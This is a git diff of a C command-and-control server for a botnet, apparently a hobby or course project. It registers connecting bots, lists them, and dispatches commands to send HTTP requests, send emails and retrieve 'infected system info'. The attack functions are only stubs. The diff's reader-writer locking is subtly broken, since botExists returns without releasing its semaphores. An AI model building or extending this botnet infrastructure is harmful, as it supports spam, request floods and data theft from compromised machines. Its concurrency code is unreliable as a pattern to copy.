@@ -1,17 +1,5 @@
-#include <sys/types.h> /* See NOTES */
-#include <sys/socket.h>
+
 #include "common.h"
-#include <errno.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <time.h>
-#include <unistd.h>
-#include <arpa/inet.h>  // htons()
-#include <netinet/in.h> // struct sockaddr_in
-#include <sys/socket.h>
-#include <stdio.h>
-#include <stdbool.h>
 
 // BRAINSTORMING
 
@@ -24,34 +12,22 @@
     - p1 read from it and update its contents -> consumer
 
     should I create a c1 process (child of p1)  or a p3 process
-    that leaves a open UDP connection in order 
+    that leaves a open UDP connection in order
     to update bots active state?
 
     active_bots -> Critical section
     botExists, list_botnet , sendCommand -> unsafe for now
 */
 
-
 // BOT -> Critical section
-typedef struct
-{
-    int bot_id;
-    unsigned short int ports[3];
-    struct sockaddr_in bot_address; // in_addr ?
-
-    // If these two fields are not null the bot is active else not
-    struct in_addr target_address;
-    char action[10];
-
-    active_bots *next;
-} active_bots;
 
 active_bots *botnet;
+sem_t r, w;
+int readcount;
 
-bool botExists(int bot_id);
-void list_botnet(bool active);
-void sendCommand(char* command, int bot_id);
-
+int botExists(int bot_id);
+int list_botnet(int active);
+void sendCommand(char *command, int bot_id);
 int main(int argc, char const *argv[])
 {
     /* Accept connections from bots
@@ -63,10 +39,13 @@ int main(int argc, char const *argv[])
     */
 
     int sock_fd, bot_fd, ret, pid;
+
+    ret = initializeSemaphores();
+
     struct sockaddr_in server_addr = {0}, client_addr = {0};
     int sockaddr_len = sizeof(struct sockaddr_in);
 
-    botnet = (struct active_bots *)malloc(sizeof(active_bots));
+    botnet = (active_bots *)malloc(sizeof(active_bots));
     botnet->next = NULL;
 
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -101,7 +80,7 @@ int main(int argc, char const *argv[])
     else if (pid == 0)
     {
         printf("Child process working,handle bot connection");
-        /*TODO 
+        /*TODO
             accept connections,
              store bot info into active_bots  -> concurrent programming, the botnet struct is the critical section
              PRODUCER
@@ -109,26 +88,26 @@ int main(int argc, char const *argv[])
 
         */
         while (1)
-            {
+        {
 
-                bot_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&sockaddr_len);
-                if (bot_fd < 0)
-                    handle_error("Cannot open socket for incoming connection");
+            bot_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&sockaddr_len);
+            if (bot_fd < 0)
+                handle_error("Cannot open socket for incoming connection");
 
-                // invoke the connection_handler() method to process the request
-                fprintf(stderr, "Incoming connection accepted...\n");
+            // invoke the connection_handler() method to process the request
+            fprintf(stderr, "Incoming connection accepted...\n");
 
-                /*
+            /*
 
-                    sem_post
-                    storeBot
-                    sem_wait
-                */
-                
-                connection_handler(bot_fd);
+                sem_post
+                storeBot
+                sem_wait
+            */
 
-                fprintf(stderr, "Done!\n");
-            }
+            // connection_handler(bot_fd);
+
+            fprintf(stderr, "Done!\n");
+        }
     }
     else
     {
@@ -145,15 +124,20 @@ int main(int argc, char const *argv[])
             if (strcmp(command, LIST) == 0)
             {
                 printf("Listing active bots of current botnet");
-                // sem_wait
-                list_botnet(true);
-                // sem_post
+
+                list_botnet(1);
             }
 
             if (strcmp(command, QUIT) == 0)
             {
                 printf("Stop C&C");
                 free(botnet);
+
+                ret = closeSemaphores();
+                if (ret < 0)
+                {
+                    handle_error("Failed to close semaphores");
+                }
                 exit(EXIT_SUCCESS);
             }
             // maybe just one or multiple | statements
@@ -161,23 +145,22 @@ int main(int argc, char const *argv[])
             if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
             {
                 printf("Choose bot to which send command");
-                
-                // sem_wait
-                list_botnet(false);
-                // sem_post
+
+                list_botnet(0);
 
                 char bot_id[100];
-                fgets(bot_id,100,stdin);
+                fgets(bot_id, 100, stdin);
                 int bot = atoi(bot_id);
 
-                if(botExists(bot) == false){
+                if (botExists(bot) == false)
+                {
                     printf("Not a valid bot id");
                     continue;
-                }else{
+                }
+                else
+                {
                     sendCommand(command, bot);
                 }
-
-
             }
             else
             {
@@ -189,8 +172,6 @@ int main(int argc, char const *argv[])
         }
     }
 
-    
-
     return 0;
 }
 
@@ -198,14 +179,38 @@ int main(int argc, char const *argv[])
     active == true -> list active bots
     active == false -> list all registered bots
 */
-void list_botnet(bool active)
+int list_botnet(int active)
 {
+
+int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
 
     active_bots *bot = botnet;
 
     while (bot != NULL)
     {
-        if (active == true)
+        if (active == 1)
         {
 
             char bot_ip[INET_ADDRSTRLEN];
@@ -222,49 +227,115 @@ void list_botnet(bool active)
 
         bot = bot->next;
     }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    
+    return 1;
 }
 
-bool botExists(int bot_id){
+int botExists(int bot_id)
+{
+
+
+    int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+
+    
     active_bots *bot = botnet;
 
     while (bot != NULL)
     {
-        if( bot->bot_id == bot_id){
-            return true;
+        if (bot->bot_id == bot_id)
+        {
+            return 1;
         }
-
 
         bot = bot->next;
     }
-    return false;
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    return -1;
 }
 
-/* 
-* Instanciate TCP connection in order to track current bots -> another fork?
-* email -> send array of email addresses, content 
-* HTTP_REQ -> send http request as string "e.g curl ..." 
-* SYS_INFO -> nothing
-*/
-void sendCommand(char* command, int bot_id){
+/*
+ * Instanciate TCP connection in order to track current bots -> another fork?
+ * email -> send array of email addresses, content
+ * HTTP_REQ -> send http request as string "e.g curl ..."
+ * SYS_INFO -> nothing
+ */
+void sendCommand(char *command, int bot_id)
+{
 
+    if (strcmp(command, HTTP_REQ) == 0)
+    {
+        printf("Sending http request ");
 
-    if (strcmp(command, HTTP_REQ) == 0){
-      printf("Sending http request ");
-
-      return;
+        return;
     }
 
-    if( strcmp(command, EMAIL) == 0){
-      printf("Sending emails ");
+    if (strcmp(command, EMAIL) == 0)
+    {
+        printf("Sending emails ");
         // TODO from: to: subject: content:
-      return;
+        return;
     }
-    if(strcmp(command, SYS_INFO) == 0){
-      printf("Retrieving infected system info ");
+    if (strcmp(command, SYS_INFO) == 0)
+    {
+        printf("Retrieving infected system info ");
 
-      return;
+        return;
     }
-
-
-
 }
